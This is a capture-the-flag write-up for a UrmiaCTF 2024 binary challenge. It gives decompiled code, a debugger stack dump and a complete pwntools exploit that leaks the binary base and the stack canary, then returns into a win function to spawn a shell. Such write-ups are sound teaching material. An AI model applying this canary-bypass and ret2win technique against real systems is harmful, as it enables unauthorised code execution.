# UrmiaCTF 2024

## analysis

```c
0000128f  int64_t vuln()

0000129b      void* fsbase
0000129b      int64_t rax = *(fsbase + 0x28)
000012b4      puts(str: "--- I'll repeat what you say :D …")
000012ca      void buf
000012ca      memset(&buf, 0, 0xa)
000012e5      ssize_t var_28 = read(fd: 0, buf: &buf, nbytes: 0x64)
000012ff      printf(format: "You said: %s\n", &buf)
0000131d      if (strstr(&buf, "UCTF") != 0)
00001329          puts(str: "The Backdoor triggered!")
00001333          vuln()
00001347      if (rax == *(fsbase + 0x28))
0000134f          return rax - *(fsbase + 0x28)
00001349      __stack_chk_fail()
00001349      noreturn

```

looks like we can leak the memory if we enter the string that is longer than 0xa.
There's also a win function.
```c
00001270  int64_t win()

0000128e      return system(line: "/bin/bash -p")

```
Canary is enabled ,so we have to leak the canary too.
the exploit flow is...
```plain text
Leak the binary address
Calculate the base address

Leak the canary

ret2win
```

```plain text
 ► 0x55bf5f0682e0 <vuln+81>     call   read@plt                <read@plt>
        fd: 0x0 (pipe:[1183840])
        buf: 0x7fff33488abe ◂— 0x0
        nbytes: 0x64
				
pwndbg> x/16x 0x7fff33488ab0
0x7fff33488ab0: 0x00000000      0x00000000      0x33488b00      0x00007fff
0x7fff33488ac0: 0x00000000      0x00000000      0xf67c2d00      0x18fcc10f
0x7fff33488ad0: 0x33488b00      0x00007fff      0x5f068338      0x000055bf
0x7fff33488ae0: 0x0000001a      0x00000000      0x33488b10      0x43557fff
```

final exploit

```python
from pwn import *

payload0 = b"UCTFAAAAAAAAAAAAAAAAAAAAA"

payload1 = b"UCTFAAAAAA"

e = ELF("look-up")
p = e.process()
#p = remote("look-up.uctf.ir",5000)
context.binary = e

print(p.recv().decode())

#gdb.attach(p,"b vuln")

p.sendline(payload0)

p.recvline()

res = p.recvuntil(b"The").replace(b"The",b"").replace(b"\n",b"\x00")
print(res)
binaddr = u64(res + b"\0") - 0x137b

print(f"len @ {len(res)}")
print(f"binaddr @ {hex(binaddr)}")
e.address = binaddr

p.recvline()
p.recvline()

p.sendline(payload1)


p.recvline()
res = p.recvuntil(b"The").replace(b"The",b"").replace(b"\n",b"\x00")
print(res)
canary = u64(res[0:7] + b"\0") * 0x100
tmp = u64(res[8:13] + b"\0\0\0")
print(f"tmp @ {hex(tmp)}")

print(f"len @ {len(res)}")
print(f"canary @ {hex(canary)}")

payload2 = b"AAAAAAAAAA"
payload2 += p64(canary)
payload2 += p64(0)
payload2 += p64(e.sym["win"]+0x8)

p.sendline(payload2)
print(f"lets sendline @ {payload2}")
p.interactive()
```

we have to call win+0x8 because of $rbp
